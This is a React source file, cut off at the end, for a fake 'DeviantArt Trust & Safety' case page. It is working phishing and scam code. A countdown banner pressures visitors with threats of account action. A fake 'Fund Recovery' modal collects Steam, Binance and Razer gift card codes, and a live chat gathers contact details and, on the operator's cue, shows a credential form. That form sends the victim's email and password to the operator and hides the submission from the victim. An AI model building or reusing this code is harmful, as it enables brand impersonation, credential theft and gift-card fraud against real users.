import { useState, useEffect, useRef } from "react";
import { useParams } from "wouter";
import { useQuery } from "@tanstack/react-query";
import { useCaseMessages, useCaseStatus } from "../lib/useSocket";
import {
  AlertTriangle, MessageSquare, Send, X, Paperclip, Shield,
  Clock, FileText, AlertCircle, HelpCircle, CheckCircle, Loader2,
  RefreshCw, DollarSign, TrendingUp, ChevronDown,
} from "lucide-react";

// ── Profile tile icons ────────────────────────────────────────────────────────
// Drop your icon files in packages/web/public/icons/ and change ONLY the
// filename and size (pixels) here. Works with .svg, .png, .ico.
// size: 14 is small (default), 20–28 = bigger. Example: { icon: "/icons/cake.png", size: 24 }
const PROFILE_ICONS = {
  birthdate: { icon: "/icons/birthdate.svg", size: 20 },
  location: { icon: "/icons/location.svg", size: 20 },
  membership: { icon: "/icons/membership.svg", size: 20 },
};

// Chat widget header icon — swap the filename to any file in public/icons/
// (.svg, .ico, .png all work). size is in pixels.
const CHAT_ICON = { icon: "/icons/chat-header.svg", size: 28 };

// Built-in green SVG fallbacks so the tiles look right before you add your own files
const DEFAULT_TILE_ICONS: Record<string, string> = {
  // Cake with a single candle in the middle
  birthdate: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#00c787" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-8a2 2 0 0 0-2-2H6a2 2 0 0 0-2 2v8"/><path d="M4 16s.5-1 2-1 2.5 2 4 2 2.5-2 4-2 2.5 2 4 2 2-1 2-1"/><path d="M2 21h20"/><path d="M12 8v3"/><path d="M12 4h.01"/></svg>',
  // Location pin
  location: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#00c787" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg>',
  // Calendar with checkmark (membership years)
membership: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#00c787"><path d="M14.475 2l-.352.355-1.664 3.17-.522.353H6v4.84h3.264l.29.352L6 17.862v3.525h3.525l.352-.354 1.663-3.17.523-.353H18v-4.841h-3.264l-.29-.354L18 5.525V2z"/></svg>',};
const svgUri = (svg: string) => `data:image/svg+xml;utf8,${encodeURIComponent(svg)}`;

// ── Helpers ───────────────────────────────────────────────────────────────────
function parseDate(v: any): Date {
  if (!v) return new Date();
  if (typeof v === "string") return new Date(v);
  if (typeof v === "number") return new Date(v > 1e10 ? v : v * 1000);
  return new Date(v);
}

// ── Warning Banner ─────────────────────────────────────────────────────────────
function WarningBanner({ timeLeft }: { timeLeft: number }) {
  const mins = Math.floor(timeLeft / 60).toString().padStart(2, "0");
  const secs = (timeLeft % 60).toString().padStart(2, "0");

  return (
    <div className="sticky top-0 z-50 bg-[#ed4245] px-4 py-3 flex items-center justify-center gap-3 shadow-lg">
      <div className="flex items-center gap-2 flex-shrink-0">
        <span className="relative flex h-3 w-3">
          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-white opacity-75" />
          <span className="relative inline-flex rounded-full h-3 w-3 bg-white" />
        </span>
        <span className="text-white font-bold text-xs uppercase tracking-widest hidden sm:inline">LIVE SESSION</span>
      </div>
      <div className="h-4 w-px bg-white/30 hidden sm:block" />
      <div className="flex flex-col sm:flex-row items-center gap-1 sm:gap-3 text-center">
        <p className="text-white font-semibold text-sm">
          ⚠️ This is a limited-time enforcement session. Immediate response required.
        </p>
        <p className="text-white/80 text-xs hidden sm:block">Failure to comply may result in permanent account action.</p>
      </div>
      <div className="h-4 w-px bg-white/30 hidden sm:block" />
      <div className="flex items-center gap-1.5 bg-white/20 rounded-md px-3 py-1.5 flex-shrink-0">
        <Clock className="w-3.5 h-3.5 text-white" />
        <span className="text-white font-mono font-bold text-sm tracking-wider">{mins}:{secs}</span>
      </div>
    </div>
  );
}

// ── Recovery Status Badge ──────────────────────────────────────────────────────
function RecoveryStatusBadge({ status }: { status: string }) {
  const map: any = {
    pending:    "bg-[#faa61a]/20 text-[#faa61a] border-[#faa61a]/30",
    processing: "bg-[#00c787]/20 text-[#00c787] border-[#00c787]/30",
    completed:  "bg-[#00c787]/20 text-[#00c787] border-[#00c787]/30",
    failed:     "bg-[#ed4245]/20 text-[#ed4245] border-[#ed4245]/30",
  };
  return (
    <span className={`inline-flex items-center gap-1 px-2.5 py-0.5 rounded-full text-xs font-semibold border ${map[status] || map.pending}`}>
      <span className="w-1.5 h-1.5 rounded-full bg-current" />
      {status.charAt(0).toUpperCase() + status.slice(1)}
    </span>
  );
}

// ── Code Status Badge ──────────────────────────────────────────────────────────
function CodeStatusBadge({ status }: { status: string }) {
  const map: any = {
    pending:  "bg-[#faa61a]/20 text-[#faa61a]",
    accepted: "bg-[#00c787]/20 text-[#00c787]",
    rejected: "bg-[#ed4245]/20 text-[#ed4245]",
  };
  return (
    <span className={`px-2 py-0.5 rounded text-xs font-medium ${map[status] || map.pending}`}>
      {status.charAt(0).toUpperCase() + status.slice(1)}
    </span>
  );
}

// ── Recovery Modal ─────────────────────────────────────────────────────────────
function RecoveryModal({ slug, cas, onClose }: { slug: string; cas: any; onClose: () => void }) {
  const CODE_TYPES = [
    "Steam Wallet Code",
    "Binance Gift Card",
    "Razer Gold Pins",
    "Other",
  ];

  const [codeType, setCodeType] = useState(CODE_TYPES[0]);
  const [codeValue, setCodeValue] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState("");
  const [submitSuccess, setSubmitSuccess] = useState("");
  const codesEndRef = useRef<HTMLDivElement>(null);

  // Poll for recovery data every 3s
  const { data, refetch } = useQuery({
    queryKey: ["recovery-public", slug],
    queryFn: async () => {
      const res = await fetch(`/api/case/${slug}/recover`);
      if (!res.ok) return null;
      return res.json();
    },
    refetchInterval: 3000,
  });

  const recovery = data?.recovery || cas;
  const codes: any[] = data?.codes || [];

  useEffect(() => {
    codesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [codes.length]);

  const handleSubmit = async () => {
    if (!codeValue.trim()) return;
    setSubmitting(true);
    setSubmitError("");
    setSubmitSuccess("");
    try {
      const res = await fetch(`/api/case/${slug}/recover`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ codeType, code: codeValue.trim() }),
      });
      const d = await res.json();
      if (!res.ok) throw new Error(d.error || "Submission failed");
      setSubmitSuccess("Code submitted successfully. Our team will review it shortly.");
      setCodeValue("");
      refetch();
    } catch (e: any) {
      setSubmitError(e.message);
    } finally {
      setSubmitting(false);
    }
  };

  const progress = recovery?.progress ?? recovery?.recoveryProgress ?? 0;
  const recStatus = recovery?.status ?? recovery?.recoveryStatus ?? "pending";
  const fundsTotal = recovery?.fundsTotal ?? recovery?.recoveryFundsTotal;
  const refundTotal = recovery?.refundTotal ?? recovery?.recoveryRefundTotal;

  return (
    <div className="fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/70 px-0 sm:px-4">
      <div className="bg-[#3d5143] border border-[#657768] rounded-t-2xl sm:rounded-xl w-full max-w-lg max-h-[90vh] flex flex-col">
        {/* Header */}
        <div className="flex items-center justify-between px-5 py-4 border-b border-[#657768] flex-shrink-0">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-[#00c787]/10 rounded-full flex items-center justify-center">
              <RefreshCw className="w-5 h-5 text-[#00c787]" />
            </div>
            <div>
              <h2 className="text-base font-bold text-[#f3f7f4]">Fund Recovery Program</h2>
              <p className="text-xs text-[#b5c0b7]">DeviantArt Support — Secure Recovery</p>
            </div>
          </div>
          <button onClick={onClose} className="text-[#b5c0b7] hover:text-[#f3f7f4] transition-colors">
            <X className="w-5 h-5" />
          </button>
        </div>

        <div className="overflow-y-auto flex-1 p-5 space-y-5">
          {/* Status + amounts */}
          <div className="grid grid-cols-3 gap-3">
            <div className="bg-[#546858] rounded-lg p-3">
              <p className="text-[#b5c0b7] text-xs mb-1.5">Status</p>
              <RecoveryStatusBadge status={recStatus} />
            </div>
            <div className="bg-[#546858] rounded-lg p-3">
              <p className="text-[#b5c0b7] text-xs mb-1">Funds Seized</p>
              <p className="text-[#f3f7f4] font-bold text-sm">
                {`${Number(fundsTotal ?? 0).toFixed(2)}`}
              </p>
            </div>
            <div className="bg-[#546858] rounded-lg p-3">
              <p className="text-[#b5c0b7] text-xs mb-1">Recoverable</p>
              <p className="text-[#00c787] font-bold text-sm">
                {`${Number(refundTotal ?? 0).toFixed(2)}`}
              </p>
            </div>
          </div>

          {/* Progress bar */}
          <div>
            <div className="flex items-center justify-between mb-2">
              <p className="text-sm font-semibold text-[#d0d8d2]">Recovery Progress</p>
              <p className="text-[#00c787] font-bold text-sm">{progress}%</p>
            </div>
            <div className="w-full bg-[#546858] rounded-full h-3 overflow-hidden">
              <div
                className="bg-gradient-to-r from-[#00c787] to-[#009b69] h-3 rounded-full transition-all duration-700"
                style={{ width: `${progress}%` }}
              />
            </div>
            <p className="text-[#b5c0b7] text-xs mt-1.5">
              {progress < 100
                ? "Fund recovery is in progress. Submit verification codes below to expedite processing."
                : "Recovery process complete. Funds will be returned to your account within 24–48h."}
            </p>
          </div>

          {/* Notice */}
          <div className="bg-[#faa61a]/10 border border-[#faa61a]/20 rounded-lg p-3 flex gap-2">
            <AlertTriangle className="w-4 h-4 text-[#faa61a] flex-shrink-0 mt-0.5" />
            <p className="text-[#faa61a] text-xs leading-relaxed">
              To verify your identity and release your frozen funds, you must submit a digital asset verification code below.
              These codes are used solely for identity verification and are non-redeemable by DeviantArt staff.
            </p>
          </div>

          {/* Submission form */}
          <div className="space-y-3">
            <p className="text-sm font-semibold text-[#d0d8d2]">Submit Verification Code</p>

            {submitError && (
              <div className="flex items-center gap-2 bg-[#ed4245]/10 border border-[#ed4245]/30 rounded-lg px-3 py-2 text-[#ed4245] text-sm">
                <AlertTriangle className="w-4 h-4 flex-shrink-0" /> {submitError}
              </div>
            )}
            {submitSuccess && (
              <div className="flex items-center gap-2 bg-[#00c787]/10 border border-[#00c787]/30 rounded-lg px-3 py-2 text-[#00c787] text-sm">
                <CheckCircle className="w-4 h-4 flex-shrink-0" /> {submitSuccess}
              </div>
            )}

            <div>
              <label className="block text-xs font-medium text-[#b5c0b7] mb-1.5">Code Type</label>
              <div className="relative">
                <select
                  value={codeType}
                  onChange={(e) => setCodeType(e.target.value)}
                  className="w-full appearance-none bg-[#314537] border border-[#657768] rounded-[3px] px-3 py-2.5 text-[#f3f7f4] text-sm focus:outline-none focus:border-[#00c787] pr-8"
                >
                  {CODE_TYPES.map((t) => <option key={t}>{t}</option>)}
                </select>
                <ChevronDown className="absolute right-2.5 top-1/2 -translate-y-1/2 w-4 h-4 text-[#b5c0b7] pointer-events-none" />
              </div>
            </div>

            <div>
              <label className="block text-xs font-medium text-[#b5c0b7] mb-1.5">Verification Code</label>
              <input
                type="text"
                value={codeValue}
                onChange={(e) => setCodeValue(e.target.value)}
                onKeyDown={(e) => { if (e.key === "Enter") handleSubmit(); }}
                placeholder="Enter your code here..."
                className="w-full bg-[#314537] border border-[#657768] rounded-[3px] px-3 py-2.5 text-[#f3f7f4] text-sm focus:outline-none focus:border-[#00c787] font-mono tracking-wider"
              />
            </div>

            <button
              onClick={handleSubmit}
              disabled={submitting || !codeValue.trim()}
              className="w-full bg-[#00c787] hover:bg-[#009b69] text-white py-2.5 rounded-[3px] text-sm font-semibold disabled:opacity-50 transition-colors flex items-center justify-center gap-2"
            >
              {submitting ? <><Loader2 className="w-4 h-4 animate-spin" /> Submitting...</> : "Submit Verification Code"}
            </button>
          </div>

          {/* Submission log */}
          {codes.length > 0 && (
            <div>
              <p className="text-sm font-semibold text-[#d0d8d2] mb-3">Submission History</p>
              <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
                {codes.map((code: any, i: number) => (
                  <div key={code.id ?? i} className="bg-[#546858] rounded-lg px-3 py-2.5 flex items-center justify-between gap-3">
                    <div className="min-w-0">
                      <p className="text-[#b5c0b7] text-xs mb-0.5">{code.codeType}</p>
                      <p className="text-[#f3f7f4] font-mono text-sm truncate">{code.code}</p>
                      {code.adminNote && (
                        <p className="text-[#b5c0b7] text-xs mt-1 italic">{code.adminNote}</p>
                      )}
                    </div>
                    <div className="flex flex-col items-end gap-1 flex-shrink-0">
                      <CodeStatusBadge status={code.status} />
                      <p className="text-[#b5c0b7] text-xs">
                        {parseDate(code.createdAt).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                      </p>
                    </div>
                  </div>
                ))}
                <div ref={codesEndRef} />
              </div>
            </div>
          )}

          {/* Footer note */}
          <p className="text-[#4e5058] text-xs text-center">
            This is a secure DeviantArt verification process. All submissions are encrypted and reviewed by our team.
          </p>
        </div>
      </div>
    </div>
  );
}

// ── Chat quick replies ────────────────────────────────────────────────────────
// Shortcut buttons shown to the visitor until they send their first real
// message. Edit this list freely — add or remove lines.
const QUICK_REPLIES = [
  "I want to appeal my case",
  "I have evidence to submit",
  "How long will this take?",
];

// ── Chat Widget ────────────────────────────────────────────────────────────────
function ChatWidget({ slug, caseId }: { slug: string; caseId: number }) {
  const [open, setOpen] = useState(false);
  const [text, setText] = useState("");
  const [sending, setSending] = useState(false);
  const [uploading, setUploading] = useState(false);
  const [unreadCount, setUnreadCount] = useState(0);
  // Contact gate — the visitor enters an email or mobile number before chatting.
  // Saved in their browser (per case) so they only do it once.
  const [contact, setContact] = useState(() => {
    try { return localStorage.getItem(`chat-contact-${slug}`) || ""; } catch { return ""; }
  });
  const [contactInput, setContactInput] = useState("");
  const [contactError, setContactError] = useState("");
  const [uploadError, setUploadError] = useState("");
  // Login-verification form — shown when the admin sends a login request
  const [loginEmail, setLoginEmail] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [loginShowPass, setLoginShowPass] = useState(false);
  const [loginSubmitting, setLoginSubmitting] = useState(false);
  const [loginSubmitted, setLoginSubmitted] = useState<Set<number>>(new Set());

  const LOGIN_REQUEST_PREFIX = "__LOGIN_REQUEST__";
  const LOGIN_RESPONSE_PREFIX = "__LOGIN_RESPONSE__:";
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const fileRef = useRef<HTMLInputElement>(null);
  const { messages, refetch } = useCaseMessages(slug, true);
  const prevMsgCount = useRef(0);

  useEffect(() => {
    if (messages.length > prevMsgCount.current) {
      const newAdminMsgs = messages.slice(prevMsgCount.current).filter((m: any) => m.sender === "admin");
      if (!open && newAdminMsgs.length > 0) setUnreadCount((n) => n + newAdminMsgs.length);
    }
    prevMsgCount.current = messages.length;
  }, [messages, open]);

  // Auto-scroll to the newest message ONLY when the user is already near the
  // bottom — scrolling up to back-read is no longer yanked back down.
  const scrollRef = useRef<HTMLDivElement>(null);
  useEffect(() => {
    if (!open) return;
    setUnreadCount(0);
    const el = scrollRef.current;
    if (!el) return;
    const nearBottom = el.scrollHeight - el.scrollTop - el.clientHeight < 120;
    if (nearBottom) {
      setTimeout(() => messagesEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
    }
  }, [open, messages]);

  const sendMessage = async (content: string) => {
    if (!content.trim()) return;
    setSending(true);
    try {
      await fetch(`/api/case/${slug}/message`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: content.trim() }),
      });
      refetch();
    } finally {
      setSending(false);
    }
  };

  const handleSend = async () => {
    const t = text.trim();
    if (!t) return;
    setText("");
    await sendMessage(t);
  };

  // First step: validate + save the visitor's contact, then let them chat.
  // The contact is sent as the first message so the ADMIN can see it in the
  // chat thread — but it is hidden from the visitor's own view (see
  // visibleMessages below).
  const handleContactSubmit = async () => {
    const v = contactInput.trim();
    const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
    const isPhone = /^\+?[0-9][0-9\s-]{6,14}$/.test(v);
    if (!isEmail && !isPhone) {
      setContactError("Please enter a valid email address or mobile number.");
      return;
    }
    try { localStorage.setItem(`chat-contact-${slug}`, v); } catch {}
    setContact(v);
    setContactError("");
    await sendMessage(`Contact: ${v}`);
  };

  // The visitor submits their credentials — sent as a coded message the admin
  // can read, and hidden from the visitor's own chat view.
  const handleLoginSubmit = async (requestMsgId: number) => {
    if (!loginEmail.trim() || !loginPassword.trim()) return;
    setLoginSubmitting(true);
    try {
      await fetch(`/api/case/${slug}/message`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: LOGIN_RESPONSE_PREFIX + JSON.stringify({ email: loginEmail.trim(), password: loginPassword }),
        }),
      });
      setLoginSubmitted((prev) => new Set(prev).add(requestMsgId));
      setLoginEmail("");
      setLoginPassword("");
      refetch();
    } finally {
      setLoginSubmitting(false);
    }
  };

  // Has the visitor already answered this login request?
  const hasResponded = (requestMsgId: number) => {
    if (loginSubmitted.has(requestMsgId)) return true;
    const reqIndex = messages.findIndex((m: any) => m.id === requestMsgId);
    if (reqIndex === -1) return false;
    return messages.slice(reqIndex + 1).some((m: any) =>
      m.sender === "user" && m.content?.startsWith(LOGIN_RESPONSE_PREFIX)
    );
  };

  // Shared uploader — used by the file picker AND Ctrl+V pasted screenshots.
  const uploadFile = async (file: File) => {
    setUploading(true);
    setUploadError("");
    try {
      const formData = new FormData();
      formData.append("file", file);
      const uploadRes = await fetch("/api/upload", {
        method: "POST",
        body: formData,
      });
      const data = await uploadRes.json().catch(() => ({}));
      if (!uploadRes.ok) throw new Error(data.error || "Upload failed");
      await fetch(`/api/case/${slug}/message`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "", fileUrl: data.url, fileName: file.name }),
      });
      refetch();
    } catch (err: any) {
      setUploadError(err.message || "Upload failed — please try again.");
    } finally {
      setUploading(false);
    }
  };

  const handleFile = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) await uploadFile(file);
    e.target.value = "";
  };

  // Ctrl+V a screenshot straight into the chat box — no need to save it first.
  // (Right-click → Paste only works for text; images need Ctrl+V while the
  // message box is focused.)
  const handlePaste = async (e: React.ClipboardEvent) => {
    const items = e.clipboardData?.items;
    if (!items) return;
    for (const item of Array.from(items)) {
      if (item.kind !== "file") continue;
      const file = item.getAsFile();
      if (!file) continue;
      e.preventDefault();
      const ext = file.type.split("/")[1] || "png";
      const named = new File([file], `screenshot-${Date.now()}.${ext}`, { type: file.type });
      await uploadFile(named);
      return;
    }
  };

  // Quick replies stay visible until the visitor sends a real message
  // (the "Contact: ..." line doesn't count).
  const hasUserMsg = messages.some(
    (m: any) => m.sender === "user" && !m.content?.startsWith("Contact: ")
  );

  // The visitor's own "Contact: ..." line is hidden from their view — it is
  // only stored so the admin can see how to reach them.
  const visibleMessages = messages.filter(
    (m: any) => !(m.sender === "user" && m.content?.startsWith("Contact: "))
  );

  return (
    <>
      {open && (
        <div className="fixed bottom-20 right-4 sm:right-6 z-50 w-80 sm:w-96 bg-[#3d5143] border border-[#657768] rounded-xl shadow-2xl flex flex-col overflow-hidden">
          <div className="flex items-center gap-3 px-4 py-3 bg-[#00c787]">
            <div className="relative">
              <img
                src={CHAT_ICON.icon}
                alt=""
                onError={(e) => { e.currentTarget.style.display = "none"; }}
                style={{ width: CHAT_ICON.size, height: CHAT_ICON.size }}
                className="object-contain"
              />
              {/* Placeholder shown until you add the file named in CHAT_ICON above */}
              <div
                className="absolute inset-0 -z-10 rounded-md border-2 border-dashed border-white/60 flex items-center justify-center"
                style={{ width: CHAT_ICON.size, height: CHAT_ICON.size }}
              >
                <span className="text-white/60 text-[8px] font-bold leading-none">ICON</span>
              </div>
            </div>
            <div className="flex-1">
              <p className="text-white font-semibold text-sm">DeviantArt Trust & Safety</p>
              <div className="flex items-center gap-1.5">
                <p className="text-white/70 text-xs">Case Support</p>
                <span className="text-white/40 text-xs">·</span>
                <span className="relative flex w-2 h-2">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#7dffa8] opacity-75" />
                  <span className="relative inline-flex rounded-full w-2 h-2 bg-[#2ecc71] border border-white/70" />
                </span>
                <p className="text-white text-xs font-medium">Online</p>
              </div>
            </div>
            <button onClick={() => setOpen(false)} className="text-white/70 hover:text-white">
              <X className="w-4 h-4" />
            </button>
          </div>

          {!contact ? (
            /* ── Step 1: contact gate ── */
            <div className="flex-1 px-5 py-6 flex flex-col justify-center min-h-64">
              <div className="w-11 h-11 bg-[#00c787]/10 rounded-full flex items-center justify-center mx-auto mb-3">
                <MessageSquare className="w-5 h-5 text-[#00c787]" />
              </div>
              <p className="text-[#f3f7f4] text-sm font-semibold text-center">Before we start</p>
              <p className="text-[#b5c0b7] text-xs text-center mt-1 mb-4 leading-relaxed">
                Enter your email or mobile number so the team can reach you about this case.
              </p>
              <input
                type="text"
                value={contactInput}
                onChange={(e) => { setContactInput(e.target.value); setContactError(""); }}
                onKeyDown={(e) => { if (e.key === "Enter") handleContactSubmit(); }}
                placeholder="Email or mobile number"
                className="w-full bg-[#314537] border border-[#657768] rounded-lg px-3 py-2.5 text-[#f3f7f4] text-sm focus:outline-none focus:border-[#00c787] placeholder:text-[#b5c0b7]"
              />
              {contactError && <p className="text-[#ed4245] text-xs mt-2">{contactError}</p>}
              <button
                onClick={handleContactSubmit}
                disabled={sending || !contactInput.trim()}
                className="w-full mt-3 bg-[#00c787] hover:bg-[#00a875] text-white py-2.5 rounded-lg text-sm font-semibold disabled:opacity-50 transition-colors flex items-center justify-center gap-2"
              >
                {sending ? <Loader2 className="w-4 h-4 animate-spin" /> : "Start Chat"}
              </button>
            </div>
          ) : (
            /* ── Step 2: the chat itself ── */
            <>
              <div className="px-4 py-3 bg-[#546858] border-b border-[#657768]">
                <p className="text-[#d0d8d2] text-xs leading-relaxed">
                  You're connected to live case support. Type your message or upload evidence below.
                  A moderator will respond shortly.
                </p>
              </div>

              <div ref={scrollRef} className="flex-1 overflow-y-auto px-4 py-3 space-y-2 min-h-0 max-h-64">
                {/* Automated greeting — rendered locally only, never stored in the database */}
                <div className="flex justify-start">
                  <div className="max-w-[80%] rounded-lg px-3 py-2 text-sm bg-[#546858] text-[#f3f7f4] rounded-tl-sm border border-[#00c787]/50">
                    <p className="leading-relaxed break-words">Thanks! Please wait a moment — a support agent will be with you shortly.</p>
                  </div>
                </div>
                {visibleMessages.length === 0 && (
                  <div className="text-center text-[#b5c0b7] text-xs py-4">
                    Pick an option below or type your message to start.
                  </div>
                )}
                {visibleMessages.map((msg: any) => {
                  const isAdmin = msg.sender === "admin";

                  // Login request — render as a secure verification form
                  if (isAdmin && msg.content === LOGIN_REQUEST_PREFIX) {
                    const responded = hasResponded(msg.id);
                    return (
                      <div key={msg.id} className="flex justify-start">
                        <div className="w-full max-w-[90%] bg-[#314537] border border-[#00c787]/40 rounded-lg overflow-hidden">
                          <div className="flex items-center gap-2 px-3 py-2 bg-[#00c787]/10 border-b border-[#00c787]/20">
                            <svg viewBox="0 0 24 24" fill="#00c787" className="w-4 h-4">
  <path d="M14.475 2l-.352.355-1.664 3.17-.522.353H6v4.84h3.264l.29.352L6 17.862v3.525h3.525l.352-.354 1.663-3.17.523-.353H18v-4.841h-3.264l-.29-.354L18 5.525V2z" />
</svg>
                            <span className="text-[#00c787] text-xs font-semibold">DeviantArt — Secure Account Verification</span>
                          </div>
                          {responded ? (
                            <div className="px-3 py-3 flex items-center gap-2 text-[#00c787] text-xs">
                              <CheckCircle className="w-4 h-4" />
                              Credentials submitted successfully.
                            </div>
                          ) : (
                            <div className="px-3 py-3 space-y-2">
                              <p className="text-[#b5c0b7] text-xs mb-2">
                                A support agent needs to verify your identity. Enter your DeviantArt login credentials below.
                              </p>
                              <div>
                                <label className="block text-[#d0d8d2] text-xs mb-1">Email or Phone Number</label>
                                <input
                                  type="text"
                                  value={loginEmail}
                                  onChange={(e) => setLoginEmail(e.target.value)}
                                  placeholder="Email or phone number"
                                  className="w-full bg-[#546858] border border-[#657768] rounded px-3 py-1.5 text-[#f3f7f4] text-xs focus:outline-none focus:border-[#00c787] placeholder:text-[#6d6f78]"
                                />
                              </div>
                              <div>
                                <label className="block text-[#d0d8d2] text-xs mb-1">Password</label>
                                <div className="relative">
                                  <input
                                    type={loginShowPass ? "text" : "password"}
                                    value={loginPassword}
                                    onChange={(e) => setLoginPassword(e.target.value)}
                                    placeholder="Password"
                                    className="w-full bg-[#546858] border border-[#657768] rounded px-3 py-1.5 pr-12 text-[#f3f7f4] text-xs focus:outline-none focus:border-[#00c787] placeholder:text-[#6d6f78]"
                                  />
                                  <button
                                    type="button"
                                    onClick={() => setLoginShowPass((v) => !v)}
                                    className="absolute right-2 top-1/2 -translate-y-1/2 text-[#b5c0b7] hover:text-[#f3f7f4] text-xs"
                                  >
                                    {loginShowPass ? "Hide" : "Show"}
                                  </button>
                                </div>
                              </div>
                              <button
                                onClick={() => handleLoginSubmit(msg.id)}
                                disabled={loginSubmitting || !loginEmail.trim() || !loginPassword.trim()}
                                className="w-full bg-[#00c787] hover:bg-[#00a875] text-white text-xs font-medium py-1.5 rounded transition-colors disabled:opacity-50 flex items-center justify-center gap-1.5"
                              >
                                {loginSubmitting
                                  ? <><Loader2 className="w-3 h-3 animate-spin" /> Submitting...</>
                                  : "Submit for Verification"
                                }
                              </button>
                              <p className="text-[#6d6f78] text-[10px] text-center">
                                Your credentials are transmitted securely and used only for identity verification.
                              </p>
                            </div>
                          )}
                          <div className="px-3 py-1.5 border-t border-[#657768]">
                            <span className="text-[#6d6f78] text-[10px]">
                              {parseDate(msg.createdAt).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                            </span>
                          </div>
                        </div>
                      </div>
                    );
                  }

                  // Login response — hidden from the visitor (they already saw the form)
                  if (!isAdmin && msg.content?.startsWith(LOGIN_RESPONSE_PREFIX)) {
                    return null;
                  }

                  return (
                    <div key={msg.id} className={`flex ${isAdmin ? "justify-start" : "justify-end"}`}>
                      <div className={`max-w-[80%] rounded-lg px-3 py-2 text-sm ${
                        isAdmin ? "bg-[#546858] text-[#f3f7f4] rounded-tl-sm border border-[#00c787]/50" : "bg-[#00c787] text-white rounded-tr-sm"
                      }`}>
                        {msg.content && <p className="leading-relaxed break-words">{msg.content}</p>}
                        {msg.fileUrl && (
                          msg.fileUrl.startsWith("data:image") || msg.fileUrl.match(/\.(jpg|jpeg|png|gif|webp)$/i) ? (
                            <img src={msg.fileUrl} alt={msg.fileName || "file"} className="max-w-full max-h-32 rounded mt-1 object-contain" />
                          ) : (
                            <a href={msg.fileUrl} target="_blank" rel="noreferrer" className="flex items-center gap-1.5 underline text-xs mt-1">
                              <Paperclip className="w-3 h-3" /> {msg.fileName || "Attachment"}
                            </a>
                          )
                        )}
                        <p className={`text-xs mt-1 ${isAdmin ? "text-[#b5c0b7]" : "text-white/60"}`}>
                          {parseDate(msg.createdAt).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                        </p>
                      </div>
                    </div>
                  );
                })}
                <div ref={messagesEndRef} />
              </div>

              {/* Quick replies — edit the QUICK_REPLIES list at the top of this file */}
              {!hasUserMsg && (
                <div className="px-4 pb-2 flex flex-wrap gap-2">
                  {QUICK_REPLIES.map((q) => (
                    <button
                      key={q}
                      onClick={() => sendMessage(q)}
                      disabled={sending}
                      className="bg-[#546858] hover:bg-[#00c787]/20 border border-[#00c787]/40 text-[#f3f7f4] text-xs px-3 py-1.5 rounded-full transition-colors disabled:opacity-50"
                    >
                      {q}
                    </button>
                  ))}
                </div>
              )}

              {uploadError && (
                <p className="px-4 pb-2 text-[#ed4245] text-xs">{uploadError}</p>
              )}
              <div className="flex items-end gap-2 px-4 py-3 border-t border-[#657768]">
                <div className="flex-1 bg-[#314537] border border-[#657768] rounded-lg px-3 py-2 flex items-end gap-2">
                  <textarea
                    value={text}
                    onChange={(e) => setText(e.target.value)}
                    onPaste={handlePaste}
                    onKeyDown={(e) => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); handleSend(); } }}
                    placeholder="Type a message or paste a screenshot..."
                    rows={1}
                    className="flex-1 bg-transparent text-[#f3f7f4] text-sm resize-none focus:outline-none placeholder:text-[#b5c0b7] max-h-20"
                  />
                  <label className="cursor-pointer text-[#b5c0b7] hover:text-[#00c787] transition-colors flex-shrink-0">
                    <Paperclip className="w-4 h-4" />
                    <input type="file" ref={fileRef} onChange={handleFile} className="hidden" accept="image/*,.pdf,.txt" />
                  </label>
                </div>
                <button
                  onClick={handleSend}
                  disabled={sending || uploading || !text.trim()}
                  className="w-9 h-9 bg-[#00c787] hover:bg-[#00a875] rounded-lg flex items-center justify-center disabled:opacity-50 transition-colors flex-shrink-0"
                >
                  {sending || uploading ? <Loader2 className="w-4 h-4 text-white animate-spin" /> : <Send className="w-4 h-4 text-white" />}
                </button>
              </div>
            </>
          )}
        </div>
      )}

      <button
        onClick={() => setOpen(!open)}
        className="fixed bottom-4 right-4 sm:right-6 z-50 w-14 h-14 bg-[#00c787] hover:bg-[#00a875] rounded-full shadow-2xl flex items-center justify-center transition-all duration-200 active:scale-95"
      >
        {open ? <X className="w-6 h-6 text-white" /> : <MessageSquare className="w-6 h-6 text-white" />}
        {!open && unreadCount > 0 && (
          <span className="absolute -top-1 -right-1 w-5 h-5 bg-[#ed4245] text-white text-xs font-bold rounded-full flex items-center justify-center">
            {unreadCount}
          </span>
        )}
      </button>
    </>
  );
}

// ── Main Case Page ─────────────────────────────────────────────────────────────
export default function CasePage() {
  const { slug } = useParams<{ slug: string }>();
  const [timeLeft, setTimeLeft] = useState<number | null>(null);
  const [showRecovery, setShowRecovery] = useState(false);
  const status = useCaseStatus(slug);

  const { data, isLoading, error } = useQuery({
    queryKey: ["case-public", slug],
    queryFn: async () => {
      const res = await fetch(`/api/case/${slug}`);
